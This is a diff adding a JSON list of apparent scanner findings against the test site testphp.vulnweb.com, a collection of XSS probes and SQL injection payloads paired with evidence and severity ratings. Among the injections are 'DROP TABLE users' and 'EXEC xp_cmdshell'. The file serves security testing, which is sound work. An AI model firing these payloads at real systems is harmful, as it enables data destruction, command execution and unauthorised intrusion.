@@ -1,0 +1,272 @@
+[
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "-",
+    "payload": "-",
+    "vuln_type": "csrf",
+    "evidence": "Missing CSRF token",
+    "severity": "medium"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "<script>alert(1)</script>",
+    "vuln_type": "xss",
+    "evidence": "payload reflected in HTML",
+    "severity": "medium"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "\"><img src=x onerror=alert(1)>",
+    "vuln_type": "xss",
+    "evidence": "payload reflected in HTML",
+    "severity": "medium"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "<svg/onload=alert(1)>",
+    "vuln_type": "xss",
+    "evidence": "payload reflected in HTML",
+    "severity": "medium"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "<body onload=alert(1)>",
+    "vuln_type": "xss",
+    "evidence": "payload reflected in HTML",
+    "severity": "medium"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "<iframe src=\"javascript:alert(1)\"></iframe>",
+    "vuln_type": "xss",
+    "evidence": "payload reflected in HTML",
+    "severity": "medium"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "<math><mi xlink:href=\"javascript:alert(1)\">x</math>",
+    "vuln_type": "xss",
+    "evidence": "payload reflected in HTML",
+    "severity": "medium"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "<details open ontoggle=alert(1)>",
+    "vuln_type": "xss",
+    "evidence": "payload reflected in HTML",
+    "severity": "medium"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "<video><source onerror=alert(1)></video>",
+    "vuln_type": "xss",
+    "evidence": "payload reflected in HTML",
+    "severity": "medium"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "<object data=\"javascript:alert(1)\"></object>",
+    "vuln_type": "xss",
+    "evidence": "payload reflected in HTML",
+    "severity": "medium"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "\"><svg><script>alert(1)</script></svg>",
+    "vuln_type": "xss",
+    "evidence": "payload reflected in HTML",
+    "severity": "medium"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "<img src=x onerror=prompt(1)>",
+    "vuln_type": "xss",
+    "evidence": "payload reflected in HTML",
+    "severity": "medium"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "<iframe onload=alert(1)>",
+    "vuln_type": "xss",
+    "evidence": "payload reflected in HTML",
+    "severity": "medium"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "' OR 1=1-- ",
+    "vuln_type": "xss",
+    "evidence": "payload reflected in HTML",
+    "severity": "medium"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "' OR 1=1-- ",
+    "vuln_type": "sqli",
+    "evidence": "SQL error string detected",
+    "severity": "high"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "\" OR \"\" = \"",
+    "vuln_type": "xss",
+    "evidence": "payload reflected in HTML",
+    "severity": "medium"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "' OR 'x'='x",
+    "vuln_type": "xss",
+    "evidence": "payload reflected in HTML",
+    "severity": "medium"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "' OR SLEEP(5)-- ",
+    "vuln_type": "xss",
+    "evidence": "payload reflected in HTML",
+    "severity": "medium"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "' OR SLEEP(5)-- ",
+    "vuln_type": "sqli",
+    "evidence": "SQL error string detected",
+    "severity": "high"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "'; DROP TABLE users;-- ",
+    "vuln_type": "xss",
+    "evidence": "payload reflected in HTML",
+    "severity": "medium"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "'; DROP TABLE users;-- ",
+    "vuln_type": "sqli",
+    "evidence": "SQL error string detected",
+    "severity": "high"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "' UNION SELECT NULL, NULL-- ",
+    "vuln_type": "xss",
+    "evidence": "payload reflected in HTML",
+    "severity": "medium"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "' UNION SELECT NULL, NULL-- ",
+    "vuln_type": "sqli",
+    "evidence": "SQL error string detected",
+    "severity": "high"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "' AND (SELECT COUNT(*) FROM users)>0--",
+    "vuln_type": "xss",
+    "evidence": "payload reflected in HTML",
+    "severity": "medium"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "\" AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
+    "vuln_type": "xss",
+    "evidence": "payload reflected in HTML",
+    "severity": "medium"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "' OR '1'='1' /*",
+    "vuln_type": "xss",
+    "evidence": "payload reflected in HTML",
+    "severity": "medium"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "' OR '1'='1' /*",
+    "vuln_type": "sqli",
+    "evidence": "SQL error string detected",
+    "severity": "high"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "'; EXEC xp_cmdshell('dir');--",
+    "vuln_type": "xss",
+    "evidence": "payload reflected in HTML",
+    "severity": "medium"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "'; EXEC xp_cmdshell('dir');--",
+    "vuln_type": "sqli",
+    "evidence": "SQL error string detected",
+    "severity": "high"
+  },
+  {
+    "page": "http://testphp.vulnweb.com",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "field": "searchFor",
+    "payload": "' OR EXISTS(SELECT * FROM users)--",
+    "vuln_type": "xss",
+    "evidence": "payload reflected in HTML",
+    "severity": "medium"
+  }
+]
